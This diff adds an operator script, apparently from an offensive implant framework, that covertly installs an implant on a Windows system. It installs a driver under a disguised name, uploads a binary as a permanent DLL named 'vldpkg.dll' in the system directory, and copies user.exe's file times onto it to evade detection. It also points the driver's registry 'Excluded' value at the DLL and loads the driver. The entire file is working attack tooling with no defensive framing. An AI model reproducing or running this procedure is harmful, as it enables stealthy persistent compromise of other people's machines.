@@ -1,0 +1,129 @@
+
+@include "_Paths.dsi";
+@include "windows/_RegistryIncludes.dsi";
+@echo off;
+
+if ($argc < 2)
+{
+	echo("* Invalid parmeters", ERROR);
+	echo();
+	echo("Usage: $argv[0] <localFile> [driverName]");
+	return false;
+}
+
+string $localFile	= $argv[1];
+string $driverName	= "mrxsmbmg";
+if ($argc >= 2)
+{
+	$driverName = $argv[2];
+}
+
+# get the system path
+string $sysPath;
+if (!_GetSystemPath($sysPath))
+{
+	echo("* Failed to get system path", ERROR);
+	return false;
+}
+
+# get the DLL value
+string $defaultDllName = "$sysPath\\vldpkg.dll";
+string $dllName;
+if (!GetInput("PC DLL install name", $dllName, $defaultDllName))
+{
+	echo("* Failed to get PC install name", ERROR);
+	return false;
+}
+
+@echo off;
+if (!`utbu_install -name $driverName -quiet`)
+{
+	return false;
+}
+
+# upload the PC binary
+echo "Uploading PC";
+if (!`put "$localFile" -name "$dllName" -permanent`)
+{
+	echo("    FAILED", ERROR);
+	if (prompt("Perform cleanup?"))
+	{
+		`utbu_uninstall -name $driverName -quiet`;
+	}
+	return false;
+}
+echo("    FINISHED", GOOD);
+
+# matchtimes on the file
+string $matchName = "user.exe";
+echo "Matching filetimes with $matchName";
+if (!`matchfiletimes -src "$sysPath\\$matchName" -dst "$dllName"`)
+{
+	echo("    FAILED (continuing anyway)", WARNING);
+	pause;
+	# continue...
+}
+else
+{
+	echo("    FINISHED", GOOD);
+}
+
+#if ($dllName != $defaultDllName)
+#{
+	# force the use of the excluded key name
+	# TODO: the code seems like it may be using the wrong value maybe the default munged name is incorrect?
+	echo "Setting registry value with alternate PC location";
+	`registryadd -hive L -key "SYSTEM\\CurrentControlSet\\Services\\$driverName\\Parameters"`;
+	if (!_SetRegistryValue("L",
+						   "SYSTEM\\CurrentControlSet\\Services\\$driverName\\Parameters",
+						   "Excluded",
+						   $dllName,
+						   "REG_SZ"))
+	{
+		echo("    FAILED", ERROR);
+		if (prompt("Perform cleanup?"))
+		{
+			`utbu_uninstall -name $driverName -quiet`;
+			echo "Deleting PC";
+			if (!`delete -file "$dllName"`)
+			{
+				echo("    FAILED", ERROR);
+			}
+			else
+			{
+				echo("    DELETED", GOOD);
+			}
+		}			
+		return false;
+	}
+	else
+	{
+		echo("    SET", GOOD);
+	}
+#}
+
+echo "Loading driver";
+if (!`utbu_load -name $driverName -silent`)
+{
+	echo("    FAILED", ERROR);
+	if (prompt("Perform cleanup?"))
+	{
+		`utbu_uninstall -name $driverName -quiet`;
+		echo "Deleting PC";
+		if (!`delete -file "$dllName"`)
+		{
+			echo("    FAILED", ERROR);
+		}
+		else
+		{
+			echo("    DELETED", GOOD);
+		}
+	}
+	return false;
+}
+else
+{
+	echo("    SUCCESS", GOOD);
+}
+
+return true;
